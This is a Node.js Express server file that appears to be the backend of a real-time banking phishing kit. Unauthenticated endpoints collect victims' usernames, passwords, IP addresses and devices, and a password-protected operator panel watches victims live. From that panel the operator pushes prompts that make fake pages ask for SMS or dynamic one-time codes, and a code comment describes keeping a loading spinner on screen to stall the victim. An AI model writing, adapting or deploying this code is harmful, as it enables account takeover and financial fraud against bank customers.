const express = require('express');
const path = require('path');
const app = express();

const PORT = process.env.PORT || 3000;

app.use(express.json());

const PANEL_USER = process.env.PANEL_USER || 'Morderkaiser';
const PANEL_PASSWORD = process.env.PANEL_PASSWORD || 'M3q7Xp9Wv2R4k5T8zY'; // Cambiar en Render

const authMiddleware = (req, res, next) => {
  const authHeader = req.headers.authorization;
  if (!authHeader) {
    res.setHeader('WWW-Authenticate', 'Basic realm="Admin Panel"');
    return res.status(401).send('Authentication required');
  }

  const authParts = authHeader.split(' ');
  if (authParts.length !== 2 || authParts[0].toLowerCase() !== 'basic') {
    res.setHeader('WWW-Authenticate', 'Basic realm="Admin Panel"');
    return res.status(401).send('Authentication required');
  }

  const credentials = Buffer.from(authParts[1], 'base64').toString().split(':');
  const user = credentials[0];
  const pass = credentials[1];

  if (user === PANEL_USER && pass === PANEL_PASSWORD) {
    return next();
  }

  res.setHeader('WWW-Authenticate', 'Basic realm="Admin Panel"');
  return res.status(401).send('Invalid credentials');
};

app.get('/', (req, res) => {
  res.redirect('/login.html');
});

// Expose public static folders
app.use('/css', express.static(path.join(__dirname, 'css')));
app.use('/js', express.static(path.join(__dirname, 'js')));
app.use('/assets', express.static(path.join(__dirname, 'assets')));

// Expose public HTML files individually
app.get('/login.html', (req, res) => res.sendFile(path.join(__dirname, 'login.html')));
app.get('/clave.html', (req, res) => res.sendFile(path.join(__dirname, 'clave.html')));
app.get('/index.html', (req, res) => res.sendFile(path.join(__dirname, 'index.html')));

// Protect and serve the /panel directory statically
app.use('/panel', authMiddleware, express.static(path.join(__dirname, 'panel')));

// In-memory sessions store
let sessions = {};

// 1. Create or update a session
app.post('/api/sessions', (req, res) => {
  const { id, username, password, tipoUsuario, device, ip, state } = req.body;
  if (!id) return res.status(400).json({ error: 'Missing session id' });
  
  if (sessions[id]) {
    sessions[id] = {
      ...sessions[id],
      username: username || sessions[id].username,
      password: password || sessions[id].password,
      tipoUsuario: tipoUsuario || sessions[id].tipoUsuario,
      device: device || sessions[id].device,
      ip: ip || sessions[id].ip,
      state: state || sessions[id].state,
      last_seen: Date.now(),
      updatedAt: Date.now()
    };
  } else {
    sessions[id] = {
      id,
      index: Object.keys(sessions).length + 1,
      username: username || '—',
      password: password || '—',
      tipoUsuario: tipoUsuario || 'CODIGO_PERSONA',
      device: device || 'desktop',
      ip: ip || '127.0.0.1',
      state: state || 'waiting',
      token: '',
      createdAt: Date.now(),
      last_seen: Date.now(),
      updatedAt: Date.now()
    };
  }
  res.json({ success: true, session: sessions[id] });
});

// 2. Get all sessions (calculated online state)
app.get('/api/sessions', authMiddleware, (req, res) => {
  const now = Date.now();
  const list = Object.values(sessions).map(s => {
    const online = now - s.last_seen < 20000;
    return { ...s, online };
  });
  res.json(list);
});

// 3. Get single session (polling check)
app.get('/api/sessions/:id', (req, res) => {
  const { id } = req.params;
  const session = sessions[id];
  if (!session) return res.status(404).json({ error: 'Session not found' });
  res.json(session);
});

// 4. Update session token (from OTP page)
app.post('/api/sessions/:id/token', (req, res) => {
  const { id } = req.params;
  const { token } = req.body;
  if (!sessions[id]) return res.status(404).json({ error: 'Session not found' });
  
  sessions[id].token = token;
  
  // Set state based on current action (sms or dinamica) before clearing the action
  const currentAction = sessions[id].action;
  if (currentAction === 'sms') {
    sessions[id].state = 'received-sms';
  } else {
    sessions[id].state = 'received-dinamica';
  }
  
  sessions[id].action = null; // Clear the action on the server so the spinner keeps showing!
  sessions[id].last_seen = Date.now();
  sessions[id].updatedAt = Date.now();
  res.json({ success: true, session: sessions[id] });
});

// 5. Update session ping (keepalive)
app.post('/api/sessions/:id/ping', (req, res) => {
  const { id } = req.params;
  if (!sessions[id]) return res.status(404).json({ error: 'Session not found' });
  
  sessions[id].last_seen = Date.now();
  res.json({ success: true });
});

// 6. Set action for a session (from operator panel)
app.post('/api/sessions/:id/action', authMiddleware, (req, res) => {
  const { id } = req.params;
  const { action, state } = req.body;
  if (!sessions[id]) return res.status(404).json({ error: 'Session not found' });
  
  sessions[id].state = state || sessions[id].state;
  sessions[id].action = action;
  
  // If requesting a new token input (dinamica or sms), reset the token
  if (action === 'dinamica' || action === 'sms') {
    sessions[id].token = '';
  }
  
  sessions[id].last_seen = Date.now();
  sessions[id].updatedAt = Date.now();
  res.json({ success: true, session: sessions[id] });
});

// 7. Update session state (from client page)
app.post('/api/sessions/:id/state', (req, res) => {
  const { id } = req.params;
  const { state } = req.body;
  if (!sessions[id]) return res.status(404).json({ error: 'Session not found' });
  
  sessions[id].state = state;
  sessions[id].last_seen = Date.now();
  sessions[id].updatedAt = Date.now();
  res.json({ success: true, session: sessions[id] });
});

// 8. Clear all sessions
app.post('/api/clear', authMiddleware, (req, res) => {
  sessions = {};
  res.json({ success: true });
});

// Fallback to login.html for root path
app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'login.html'));
});

app.listen(PORT, () => {
  console.log(`Server is running on port ${PORT}`);
});
